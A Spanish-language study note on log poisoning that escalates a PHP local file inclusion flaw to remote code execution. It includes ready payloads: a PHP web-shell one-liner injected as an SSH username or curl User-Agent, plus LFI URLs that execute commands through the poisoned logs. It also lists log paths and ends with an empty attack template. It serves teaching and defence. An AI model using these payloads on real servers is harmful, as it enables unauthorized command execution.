
---
- Tags: #web #vulnerabilidad 
---
# 🐚 Log Poisoning (LFI → RCE)

## 📌 Introducción

**Log Poisoning** es una técnica que permite a un atacante ejecutar comandos en un servidor **inyectando código malicioso en archivos de registro (logs)**. Esta técnica suele aprovechar una vulnerabilidad **LFI (Local File Inclusion)** para **leer un log previamente manipulado**, lo que permite ejecutar código (normalmente PHP) en el contexto del servidor.

---

## 🔗 Relación entre LFI y Log Poisoning

- [[Local File Inclusion]] por sí solo permite **leer archivos locales**.
- Log Poisoning aprovecha esa capacidad para **leer un archivo previamente envenenado con código malicioso**.
- Al incluir ese archivo con `include()` o `require()` en el servidor, el código **es interpretado** y puede llevar a una **Remote Code Execution (RCE)**.

---

## 🧪 Casos prácticos

### 📝 1. Envenenamiento del log `auth.log` de SSH

**Acción**: Durante un intento de login SSH, el atacante introduce código PHP como nombre de usuario.

```bash
ssh '<?php system($_GET["cmd"]); ?>'@IP_OBJETIVO
````

**Explicación**:

- El intento fallará, pero el **nombre de usuario** se registrará en `/var/log/auth.log`.
    
- Si el servidor tiene una vulnerabilidad LFI, por ejemplo en `vulnerable.php?page=`, el atacante puede acceder al log:
    

```bash
http://IP_OBJETIVO/vulnerable.php?page=/var/log/auth.log&cmd=id
```

**Resultado**: El servidor interpretará el código PHP que estaba en el log y ejecutará el comando pasado por `GET`.

---

### 🌐 2. Envenenamiento del log `access.log` de Apache

**Acción**: El atacante envía una petición con código PHP en la cabecera `User-Agent`.

```bash
curl -A "<?php system($_GET['cmd']); ?>" http://IP_OBJETIVO
```

**Explicación**:

- Apache registra esta cabecera en `/var/log/apache2/access.log`.
    
- El atacante accede a dicho log a través del LFI:
    

```bash
http://IP_OBJETIVO/vulnerable.php?page=/var/log/apache2/access.log&cmd=ls
```

**Resultado**: El servidor interpreta el código y ejecuta los comandos.

---

## 📁 Archivos de log relevantes por sistema operativo

|Sistema Operativo|Log SSH|Log HTTP|
|---|---|---|
|Debian / Ubuntu|`/var/log/auth.log`|`/var/log/apache2/access.log`|
|Red Hat / CentOS|`/var/log/secure` o `btmp`|`/var/log/httpd/access_log`|

> ⚠️ **Nota**: En sistemas como Red Hat, el log de autenticación puede estar en `/var/log/secure` o incluso en `btmp`, aunque este último está en formato binario y no útil para esta técnica sin conversión.

---

## ✅ Requisitos para que funcione

- La aplicación debe incluir archivos directamente (`include`, `require`, etc.).
    
- El código malicioso debe estar en un archivo que **el servidor pueda interpretar** (por ejemplo, con extensión `.php` o dentro del contexto de un `include()`).
    
- Los logs deben estar **accesibles vía LFI** y **no sanitizados**.
    

---

## 🧠 Conclusión

La técnica de Log Poisoning demuestra cómo una vulnerabilidad de lectura local (LFI) puede convertirse en una ejecución remota (RCE) si se combinan con otros vectores como la manipulación de archivos de log. Esto subraya la importancia de no solo corregir la LFI, sino también limitar el acceso a archivos sensibles y evitar la interpretación directa de contenido no confiable.

---

## 📚 Referencias adicionales

- CWE-98: Improper Control of Filename for Include/Require Statement in PHP Program (`http://cwe.mitre.org/data/definitions/98.html`)
    
- OWASP Testing Guide - LFI: `https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/07.05-Testing_for_Local_File_Inclusion`
    
---
# Secuencia del ataque

Vamos a desglosar paso a paso como sería un ataque de *Log Poisoning*

## Paso 1 -

Acción:

```Shell

```

Resultado:

```Shell

```

Explicación: 